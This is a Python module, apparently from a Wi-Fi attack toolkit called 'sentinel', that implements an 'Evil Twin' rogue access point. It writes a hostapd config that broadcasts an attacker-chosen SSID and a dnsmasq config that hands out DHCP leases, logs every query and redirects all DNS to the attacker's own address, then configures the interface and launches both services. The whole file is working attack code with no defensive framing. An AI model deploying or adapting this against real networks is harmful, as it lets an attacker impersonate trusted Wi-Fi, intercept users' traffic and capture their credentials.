import subprocess
import os
import signal
import threading
from core.logger import get_logger
from core.event_bus import event_bus
from config import config

logger = get_logger('wifi.evil_twin')

HOSTAPD_CONF = '/tmp/sentinel_hostapd.conf'
DNSMASQ_CONF = '/tmp/sentinel_dnsmasq.conf'

class EvilTwin:
    def __init__(self):
        self.iface       = config.WIFI_IFACE
        self._hostapd    = None
        self._dnsmasq    = None
        self._running    = False

    def start(self, ssid: str, channel: int = 6, portal: bool = True) -> bool:
        if self._running:
            logger.warning("Evil Twin ya está corriendo")
            return False

        try:
            self._write_hostapd_conf(ssid, channel)
            self._write_dnsmasq_conf()
            self._configure_iface()

            self._hostapd = subprocess.Popen(
                ['hostapd', HOSTAPD_CONF],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            self._dnsmasq = subprocess.Popen(
                ['dnsmasq', '-C', DNSMASQ_CONF, '--no-daemon'],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )

            self._running = True
            logger.warning(f"Evil Twin activo: SSID={ssid} CH={channel}")
            event_bus.publish('wifi.evil_twin', {
                'status':  'started',
                'ssid':    ssid,
                'channel': channel
            })
            return True
        except Exception as e:
            logger.error(f"Evil Twin falló: {e}")
            self.stop()
            return False

    def stop(self) -> None:
        for proc in [self._hostapd, self._dnsmasq]:
            if proc:
                try:
                    proc.terminate()
                    proc.wait(timeout=3)
                except Exception:
                    proc.kill()

        self._hostapd = None
        self._dnsmasq = None
        self._running = False

        # Limpiar configs temporales
        for f in [HOSTAPD_CONF, DNSMASQ_CONF]:
            try:
                os.remove(f)
            except FileNotFoundError:
                pass

        logger.info("Evil Twin detenido")
        event_bus.publish('wifi.evil_twin', {'status': 'stopped'})

    def _write_hostapd_conf(self, ssid: str, channel: int) -> None:
        conf = f"""interface={self.iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""
        with open(HOSTAPD_CONF, 'w') as f:
            f.write(conf)

    def _write_dnsmasq_conf(self) -> None:
        conf = f"""interface={self.iface}
dhcp-range=192.168.10.2,192.168.10.254,255.255.255.0,12h
dhcp-option=3,192.168.10.1
dhcp-option=6,192.168.10.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/192.168.10.1
"""
        with open(DNSMASQ_CONF, 'w') as f:
            f.write(conf)

    def _configure_iface(self) -> None:
        cmds = [
            ['ip', 'link', 'set', self.iface, 'up'],
            ['ip', 'addr', 'flush', 'dev', self.iface],
            ['ip', 'addr', 'add', '192.168.10.1/24', 'dev', self.iface],
        ]
        for cmd in cmds:
            subprocess.run(cmd, check=True)

    def is_running(self) -> bool:
        return self._running